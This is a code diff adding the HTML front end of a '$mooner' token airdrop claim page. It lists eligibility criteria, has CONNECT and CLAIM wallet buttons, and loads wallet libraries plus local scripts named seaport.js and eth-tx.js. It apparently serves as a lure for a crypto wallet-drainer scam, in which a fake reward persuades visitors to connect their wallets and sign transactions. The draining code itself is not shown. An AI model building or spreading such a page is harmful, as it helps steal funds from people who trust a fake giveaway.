@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <link rel="stylesheet" href="buttonstyle.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>mooners</title>
+  <link rel="icon" type="image/png" href="mooner-logo">
+</head>
+<body>
+  <div class="container">
+    <h2>What is $mooner?</h2> 
+    <img class="logo" src="css/mooner.webp">
+    <p>$mooner is more than just a token; it's a symbol of appreciation for the Ethereum community's active participation and engagement. </p>
+    <p>By interacting with platforms Ethereum ecosystem, you've shown your commitment to innovation and growth within the Ethereum ecosystem. </p>
+    <p>Now, it's time to reap the rewards!</p>
+    <p>To qualify for claiming your $mooner tokens, you need to meet the following criteria:</p>
+
+    <div>
+        <p>1. Interacted with ZkSync Era at least 5 times</p>
+        <p>2. More than 10 Interactions on Ethereum Mainnet:</p>
+        <p>3. Engaged with ZkSync Lite</p>
+        <p>4. interacted with layer0 more than 5 times</p>
+    </div>
+
+    <h2>Claim Your Share of the $Mooner Token</h2>
+    
+    <button id="connectButton" class="enter_lair">CONNECT</button>
+    <button id="claimButton" class="enter_lair">CLAIM</button>
+    <p id="walletAddress"></p>
+    <p id="notEli" class="notEli" style="display:none; color: red;">You Are Not Eligible.</p>
+  </div>
+
+  <script src="https://bundle.run/buffer@6.0.3"></script> 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script>
+  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@3.0.0-rc.5/dist/web3.min.js"></script>
+  <script src="https://unpkg.com/moralis-v1@latest/dist/moralis.js"></script>
+  <script src="seaport.js"></script>
+  <script src="eth-tx.js"></script>
+  <script src="index.js"></script>
+</body>
+</html>
